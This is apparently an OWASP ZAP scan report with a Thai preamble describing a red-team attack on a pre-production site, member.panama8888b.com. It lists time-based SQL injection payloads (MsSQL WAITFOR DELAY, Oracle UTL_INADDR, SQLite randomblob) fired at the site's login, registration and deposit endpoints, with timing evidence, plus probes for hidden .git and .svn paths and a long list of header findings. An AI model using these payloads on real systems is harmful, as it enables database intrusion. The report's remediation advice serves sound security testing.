# scan
เราคือ Team B ดำเนินการโจมตีเพื่อยืนยันช่องโหว่ที่พบเจอ โดยแบ่งหน้าที่
Team A จะเป็น ทีม ทีแก้ไขหลังจาก Team B ทำการโจมตี หากเจอช่องโหว่
Team B จะเป็น ทีม โจมตีเมื่อพบเจอช่องโหว่ ก่อนโปรดักชั่นจริง
*** ขณะนี้เว็บไซต์อยู่ที่ช่วง ทดสอบก่อนโปรดักชั่นจึงทำการทดสอบโจมตีจริงเต็มรูปแบบ หากสำเร็จจะดำเนินการแก้ไข ในอนาคต 
*** การโจมตีจะโจมตีจากภายนอก 100% โดยผ่านการเจาะ แสกน ด้วย ZAP เพื่อตรวจหาช่องโหว่และทำการโจมตีได้ทันทีหากเจอ 

นี่คือผลลัพย์แสกนช่องโหว่ 
Name	Risk Level	Number of Instances
SQL Injection	High	1
SQL Injection - MsSQL	High	1
SQL Injection - Oracle - Time Based	High	3
SQL Injection - SQLite	High	7
Vulnerable JS Library	High	1
CSP: Failure to Define Directive with No Fallback	Medium	1
Content Security Policy (CSP) Header Not Set	Medium	88
Cross-Domain Misconfiguration	Medium	7
Hidden File Found	Medium	2
Missing Anti-clickjacking Header	Medium	22
Session ID in URL Rewrite	Medium	56
Vulnerable JS Library	Medium	2
Big Redirect Detected (Potential Sensitive Information Leak)	Low	18
Cookie No HttpOnly Flag	Low	68
Cookie Without Secure Flag	Low	112
Cookie without SameSite Attribute	Low	112
Cross-Domain JavaScript Source File Inclusion	Low	40
Information Disclosure - Debug Error Messages	Low	1
Server Leaks Version Information via "Server" HTTP Response Header Field	Low	57
Strict-Transport-Security Header Not Set	Low	254
Timestamp Disclosure - Unix	Low	27
X-Content-Type-Options Header Missing	Low	76
Content-Type Header Missing	Informational	4
Information Disclosure - Suspicious Comments	Informational	19
Modern Web Application	Informational	4
Re-examine Cache-control Directives	Informational	45
Retrieved from Cache	Informational	737
Session Management Response Identified	Informational	85
User Agent Fuzzer	Informational	369
Alert Detail
High
SQL Injection
Description	
SQL injection may be possible.
URL	https://member.panama8888b.com/api/deposit/qr
Method	POST
Parameter	amount
Attack	3000'
Evidence	HTTP/1.1 500 Internal Server Error
Other Info	
Instances	1
Solution	
Do not trust client side input, even if there is client side validation in place.

In general, type check all data on the server side.

If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'

If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.

If database Stored Procedures can be used, use them.

Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!

Do not create dynamic SQL queries using simple string concatenation.

Escape all data received from the client.

Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.

Apply the principle of least privilege by using the least privileged database user possible.

In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.

Grant the minimum database access that is necessary for the application.
Reference	https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
CWE Id	89
WASC Id	19
Plugin Id	40018
High
SQL Injection - MsSQL
Description	
SQL injection may be possible.
URL	https://member.panama8888b.com/public/js/v2/app.js?v=25.1
Method	GET
Parameter	v
Attack	25.1)) WAITFOR DELAY '0:0:15' --
Evidence	
Other Info	The query time is controllable using parameter value [25.1)) WAITFOR DELAY '0:0:15' -- ], which caused the request to take [18,997] milliseconds, when the original unmodified query with value [25.1] took [0] milliseconds.
Instances	1
Solution	
Do not trust client side input, even if there is client side validation in place.

In general, type check all data on the server side.

If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'

If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.

If database Stored Procedures can be used, use them.

Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!

Do not create dynamic SQL queries using simple string concatenation.

Escape all data received from the client.

Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.

Apply the principle of least privilege by using the least privileged database user possible.

In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.

Grant the minimum database access that is necessary for the application.
Reference	https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
CWE Id	89
WASC Id	19
Plugin Id	40027
High
SQL Injection - Oracle - Time Based
Description	
SQL injection may be possible.
URL	https://member.panama8888b.com/public/js/v2/app.js?v=25.1
Method	GET
Parameter	v
Attack	field: [v], value [25.1 / (SELECT UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.5') from dual) ]
Evidence	
Other Info	The query time is controllable using parameter value [25.1 / (SELECT UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.5') from dual) ], which caused the request to take [33,767] milliseconds, when the original unmodified query with value [25.1] took [4,003] milliseconds.
URL	https://member.panama8888b.com/user/dashboard?line_id=%40vippnm888&tg_id=panama888v
Method	GET
Parameter	line_id
Attack	field: [line_id], value [@vippnm888' / (SELECT UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.5') from dual) / ']
Evidence	
Other Info	The query time is controllable using parameter value [@vippnm888' / (SELECT UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.5') from dual) / '], which caused the request to take [6,111] milliseconds, when the original unmodified query with value [@vippnm888] took [1,037] milliseconds.
URL	https://member.panama8888b.com/api/announcement
Method	POST
Parameter	image
Attack	field: [image], value [announcement/3yHY2OAtmvTpuQQmBZ2UmkqjAZH8id1bcDKeo6Ab.png and exists (SELECT UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.5') from dual) -- ]
Evidence	
Other Info	The query time is controllable using parameter value [announcement/3yHY2OAtmvTpuQQmBZ2UmkqjAZH8id1bcDKeo6Ab.png and exists (SELECT UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.5') from dual) -- ], which caused the request to take [15,841] milliseconds, when the original unmodified query with value [announcement/3yHY2OAtmvTpuQQmBZ2UmkqjAZH8id1bcDKeo6Ab.png] took [358] milliseconds.
Instances	3
Solution	
Do not trust client side input, even if there is client side validation in place.

In general, type check all data on the server side.

If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'

If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.

If database Stored Procedures can be used, use them.

Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!

Do not create dynamic SQL queries using simple string concatenation.

Escape all data received from the client.

Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.

Apply the principle of least privilege by using the least privileged database user possible.

In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.

Grant the minimum database access that is necessary for the application.
Reference	https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
CWE Id	89
WASC Id	19
Plugin Id	40021
High
SQL Injection - SQLite
Description	
SQL injection may be possible.
URL	https://member.panama8888b.com/auth/login
Method	POST
Parameter	password
Attack	case randomblob(10000000) when not null then 1 else 1 end
Evidence	The query time is controllable using parameter value [case randomblob(10000000) when not null then 1 else 1 end ], which caused the request to take [620] milliseconds, parameter value [case randomblob(100000000) when not null then 1 else 1 end ], which caused the request to take [1,279] milliseconds, when the original unmodified query with value [laline1812] took [514] milliseconds.
Other Info	The query time is controllable using parameter value [case randomblob(10000000) when not null then 1 else 1 end ], which caused the request to take [620] milliseconds, parameter value [case randomblob(100000000) when not null then 1 else 1 end ], which caused the request to take [1,279] milliseconds, when the original unmodified query with value [laline1812] took [514] milliseconds.
URL	https://member.panama8888b.com/public/js/v2/app.js?v=25.1
Method	GET
Parameter	v
Attack	case randomblob(100000) when not null then 1 else 1 end
Evidence	The query time is controllable using parameter value [case randomblob(100000) when not null then 1 else 1 end ], which caused the request to take [5,145] milliseconds, parameter value [case randomblob(1000000) when not null then 1 else 1 end ], which caused the request to take [11,013] milliseconds, when the original unmodified query with value [25.1] took [4,943] milliseconds.
Other Info	The query time is controllable using parameter value [case randomblob(100000) when not null then 1 else 1 end ], which caused the request to take [5,145] milliseconds, parameter value [case randomblob(1000000) when not null then 1 else 1 end ], which caused the request to take [11,013] milliseconds, when the original unmodified query with value [25.1] took [4,943] milliseconds.
URL	https://member.panama8888b.com/user/dashboard?line_id=%40vippnm888&tg_id=panama888v
Method	GET
Parameter	line_id
Attack	case randomblob(1000000) when not null then 1 else 1 end
Evidence	The query time is controllable using parameter value [case randomblob(1000000) when not null then 1 else 1 end ], which caused the request to take [559] milliseconds, parameter value [case randomblob(10000000) when not null then 1 else 1 end ], which caused the request to take [656] milliseconds, when the original unmodified query with value [@vippnm888] took [564] milliseconds.
Other Info	The query time is controllable using parameter value [case randomblob(1000000) when not null then 1 else 1 end ], which caused the request to take [559] milliseconds, parameter value [case randomblob(10000000) when not null then 1 else 1 end ], which caused the request to take [656] milliseconds, when the original unmodified query with value [@vippnm888] took [564] milliseconds.
URL	https://member.panama8888b.com/api/announcement
Method	POST
Parameter	status
Attack	case randomblob(1000000) when not null then 1 else 1 end
Evidence	The query time is controllable using parameter value [case randomblob(1000000) when not null then 1 else 1 end ], which caused the request to take [597] milliseconds, parameter value [case randomblob(10000000) when not null then 1 else 1 end ], which caused the request to take [926] milliseconds, when the original unmodified query with value [active] took [521] milliseconds.
Other Info	The query time is controllable using parameter value [case randomblob(1000000) when not null then 1 else 1 end ], which caused the request to take [597] milliseconds, parameter value [case randomblob(10000000) when not null then 1 else 1 end ], which caused the request to take [926] milliseconds, when the original unmodified query with value [active] took [521] milliseconds.
URL	https://member.panama8888b.com/api/deposit/qr
Method	POST
Parameter	amount
Attack	case randomblob(100000000) when not null then 1 else 1 end
Evidence	The query time is controllable using parameter value [case randomblob(100000000) when not null then 1 else 1 end ], which caused the request to take [197] milliseconds, parameter value [case randomblob(1000000000) when not null then 1 else 1 end ], which caused the request to take [253] milliseconds, when the original unmodified query with value [3000] took [339] milliseconds.
Other Info	The query time is controllable using parameter value [case randomblob(100000000) when not null then 1 else 1 end ], which caused the request to take [197] milliseconds, parameter value [case randomblob(1000000000) when not null then 1 else 1 end ], which caused the request to take [253] milliseconds, when the original unmodified query with value [3000] took [339] milliseconds.
URL	https://member.panama8888b.com/auth/login
Method	POST
Parameter	_token
Attack	case randomblob(10000000) when not null then 1 else 1 end
Evidence	The query time is controllable using parameter value [case randomblob(10000000) when not null then 1 else 1 end ], which caused the request to take [520] milliseconds, parameter value [case randomblob(100000000) when not null then 1 else 1 end ], which caused the request to take [592] milliseconds, when the original unmodified query with value [T4lIaNrbYMCinfqtOYOSembomVBtxlIXeMN7U1D3] took [178] milliseconds.
Other Info	The query time is controllable using parameter value [case randomblob(10000000) when not null then 1 else 1 end ], which caused the request to take [520] milliseconds, parameter value [case randomblob(100000000) when not null then 1 else 1 end ], which caused the request to take [592] milliseconds, when the original unmodified query with value [T4lIaNrbYMCinfqtOYOSembomVBtxlIXeMN7U1D3] took [178] milliseconds.
URL	https://member.panama8888b.com/register
Method	POST
Parameter	password_confirmation
Attack	case randomblob(100000000) when not null then 1 else 1 end
Evidence	The query time is controllable using parameter value [case randomblob(100000000) when not null then 1 else 1 end ], which caused the request to take [186] milliseconds, parameter value [case randomblob(1000000000) when not null then 1 else 1 end ], which caused the request to take [1,422] milliseconds, when the original unmodified query with value [ZAP] took [217] milliseconds.
Other Info	The query time is controllable using parameter value [case randomblob(100000000) when not null then 1 else 1 end ], which caused the request to take [186] milliseconds, parameter value [case randomblob(1000000000) when not null then 1 else 1 end ], which caused the request to take [1,422] milliseconds, when the original unmodified query with value [ZAP] took [217] milliseconds.
Instances	7
Solution	
Do not trust client side input, even if there is client side validation in place.

In general, type check all data on the server side.

If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'

If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.

If database Stored Procedures can be used, use them.

Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!

Do not create dynamic SQL queries using simple string concatenation.

Escape all data received from the client.

Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.

Apply the principle of least privilege by using the least privileged database user possible.

In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.

Grant the minimum database access that is necessary for the application.
Reference	https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
CWE Id	89
WASC Id	19
Plugin Id	
High
Vulnerable JS Library
Description	
The identified library appears to be vulnerable.
URL	https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.13.0-beta/js/bootstrap-select.min.js
Method	GET
Parameter	
Attack	
Evidence	/bootstrap-select/1.13.0-beta/
Other Info	The identified library bootstrap-select, version 1.13.0-beta is vulnerable. CVE-2019-20921 https://github.com/snapappointments/bootstrap-select/issues/2199 https://github.com/snapappointments/bootstrap-select/issues/2199#issuecomment-701806876
Instances	1
Solution	
Upgrade to the latest version of the affected library.
Reference	https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
CWE Id	1395
WASC Id	
Plugin Id	10003
Medium
CSP: Failure to Define Directive with No Fallback
Description	
The Content Security Policy fails to define one of the directives that has no fallback. Missing/excluding them is the same as allowing anything.
URL	http://127.0.0.1:64486/
Method	GET
Parameter	Content-Security-Policy
Attack	
Evidence	default-src 'none'; script-src 'self'; connect-src 'self'; child-src 'self'; img-src 'self' data:; font-src 'self' data:; style-src 'self'
Other Info	The directive(s): frame-ancestors, form-action is/are among the directives that do not fallback to default-src.
Instances	1
Solution	
Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header.
Reference	https://www.w3.org/TR/CSP/
https://caniuse.com/#search=content+security+policy
https://content-security-policy.com/
https://github.com/HtmlUnit/htmlunit-csp
https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources
CWE Id	693
WASC Id	15
Plugin Id	10055
Medium
Content Security Policy (CSP) Header Not Set
Description	
Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.
URL	https://member.panama8888b.com/.bzr
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/.git
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/.hg
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/.svn
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/announcement
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/deposit
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/deposit/qr
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/launch-url
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/128
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/128/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/130
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/130/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/138
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/138/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/140
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/140/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/144
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/144/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/146
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/146/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/150
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/150/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/152
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/152/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/154
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/154/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/55
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/55/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/66
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/66/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/72
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/72/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/74
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/74/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/80
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/80/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/84
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/84/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/88
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/88/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/92
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/92/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/98
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/98/items
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/category
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/api/reward/category/2
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/assets/js/vendor/jquery-slim.min.js
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/auth
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/auth/line
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/auth/login
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/cgi-bin
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/database/
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/database/.bzr
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/database/.git
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/database/.hg
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/database/.svn
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/error
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/favicon.ico
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/game
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/public/auth
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/public/auth/line
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/register
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/reward
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/reward/category
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/reward/category/1
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/reward/category/2
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/reward/category/assets/js/vendor/jquery-slim.min.js
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/robots.txt
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/sitemap.xml
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/dashboard
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/dashboard?line_id=%40vippnm888&tg_id=panama888v
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/deposit
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/history
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/refunds
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/reward
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/withdraw
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1673999601&target=OPTIMIZATION_TARGET_PAGE_VISIBILITY
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1679317318&target=OPTIMIZATION_TARGET_LANGUAGE_DETECTION
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1696268326&target=OPTIMIZATION_TARGET_OMNIBOX_URL_SCORING
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1728324084&target=OPTIMIZATION_TARGET_OMNIBOX_ON_DEVICE_TAIL_SUGGEST
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1745311339&target=OPTIMIZATION_TARGET_GEOLOCATION_PERMISSION_PREDICTIONS
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1745312779&target=OPTIMIZATION_TARGET_NOTIFICATION_PERMISSION_PREDICTIONS
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1751987362&target=OPTIMIZATION_TARGET_CLIENT_SIDE_PHISHING
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=240731042075&target=OPTIMIZATION_TARGET_SEGMENTATION_COMPOSE_PROMOTION
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=5&target=OPTIMIZATION_TARGET_PAGE_TOPICS_V2
Method	GET
Parameter	
Attack	
Evidence	
Other Info	
Instances	88
Solution	
Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.
Reference	https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy
https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
https://www.w3.org/TR/CSP/
https://w3c.github.io/webappsec-csp/
https://web.dev/articles/csp
https://caniuse.com/#feat=contentsecuritypolicy
https://content-security-policy.com/
CWE Id	693
WASC Id	15
Plugin Id	10038
Medium
Cross-Domain Misconfiguration
Description	
Web browser data loading may be possible, due to a Cross Origin Resource Sharing (CORS) misconfiguration on the web server.
URL	https://cdn.jsdelivr.net/npm/sweetalert2@8
Method	GET
Parameter	
Attack	
Evidence	Access-Control-Allow-Origin: *
Other Info	The CORS misconfiguration on the web server permits cross-domain read requests from arbitrary third party domains, using unauthenticated APIs on this domain. Web browser implementations do not permit arbitrary third parties to read the response from authenticated APIs, however. This reduces the risk somewhat. This misconfiguration could be used by an attacker to access data that is available in an unauthenticated manner, but which uses some other form of security, such as IP address white-listing.
URL	https://cdn.panama8888b.com/storage/app/public/assets/line-id.txt
Method	GET
Parameter	
Attack	
Evidence	Access-Control-Allow-Origin: *
Other Info	The CORS misconfiguration on the web server permits cross-domain read requests from arbitrary third party domains, using unauthenticated APIs on this domain. Web browser implementations do not permit arbitrary third parties to read the response from authenticated APIs, however. This reduces the risk somewhat. This misconfiguration could be used by an attacker to access data that is available in an unauthenticated manner, but which uses some other form of security, such as IP address white-listing.
URL	https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.13.0-beta/css/bootstrap-select.min.css
Method	GET
Parameter	
Attack	
Evidence	Access-Control-Allow-Origin: *
Other Info	The CORS misconfiguration on the web server permits cross-domain read requests from arbitrary third party domains, using unauthenticated APIs on this domain. Web browser implementations do not permit arbitrary third parties to read the response from authenticated APIs, however. This reduces the risk somewhat. This misconfiguration could be used by an attacker to access data that is available in an unauthenticated manner, but which uses some other form of security, such as IP address white-listing.
URL	https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.13.0-beta/js/bootstrap-select.min.js
Method	GET
Parameter	
Attack	
Evidence	Access-Control-Allow-Origin: *
Other Info	The CORS misconfiguration on the web server permits cross-domain read requests from arbitrary third party domains, using unauthenticated APIs on this domain. Web browser implementations do not permit arbitrary third parties to read the response from authenticated APIs, however. This reduces the risk somewhat. This misconfiguration could be used by an attacker to access data that is available in an unauthenticated manner, but which uses some other form of security, such as IP address white-listing.
URL	https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.6.0/slick.js
Method	GET
Parameter	
Attack	
Evidence	Access-Control-Allow-Origin: *
Other Info	The CORS misconfiguration on the web server permits cross-domain read requests from arbitrary third party domains, using unauthenticated APIs on this domain. Web browser implementations do not permit arbitrary third parties to read the response from authenticated APIs, however. This reduces the risk somewhat. This misconfiguration could be used by an attacker to access data that is available in an unauthenticated manner, but which uses some other form of security, such as IP address white-listing.
URL	https://code.jquery.com/jquery-3.2.1.slim.min.js
Method	GET
Parameter	
Attack	
Evidence	Access-Control-Allow-Origin: *
Other Info	The CORS misconfiguration on the web server permits cross-domain read requests from arbitrary third party domains, using unauthenticated APIs on this domain. Web browser implementations do not permit arbitrary third parties to read the response from authenticated APIs, however. This reduces the risk somewhat. This misconfiguration could be used by an attacker to access data that is available in an unauthenticated manner, but which uses some other form of security, such as IP address white-listing.
URL	https://www.googletagmanager.com/gtag/js?id=G-STHQJCL0VP
Method	GET
Parameter	
Attack	
Evidence	Access-Control-Allow-Origin: *
Other Info	The CORS misconfiguration on the web server permits cross-domain read requests from arbitrary third party domains, using unauthenticated APIs on this domain. Web browser implementations do not permit arbitrary third parties to read the response from authenticated APIs, however. This reduces the risk somewhat. This misconfiguration could be used by an attacker to access data that is available in an unauthenticated manner, but which uses some other form of security, such as IP address white-listing.
Instances	7
Solution	
Ensure that sensitive data is not available in an unauthenticated manner (using IP address white-listing, for instance).

Configure the "Access-Control-Allow-Origin" HTTP header to a more restrictive set of domains, or remove all CORS headers entirely, to allow the web browser to enforce the Same Origin Policy (SOP) in a more restrictive manner.
Reference	https://vulncat.fortify.com/en/detail?id=desc.config.dotnet.html5_overly_permissive_cors_policy
CWE Id	264
WASC Id	14
Plugin Id	10098
Medium
Hidden File Found
Description	
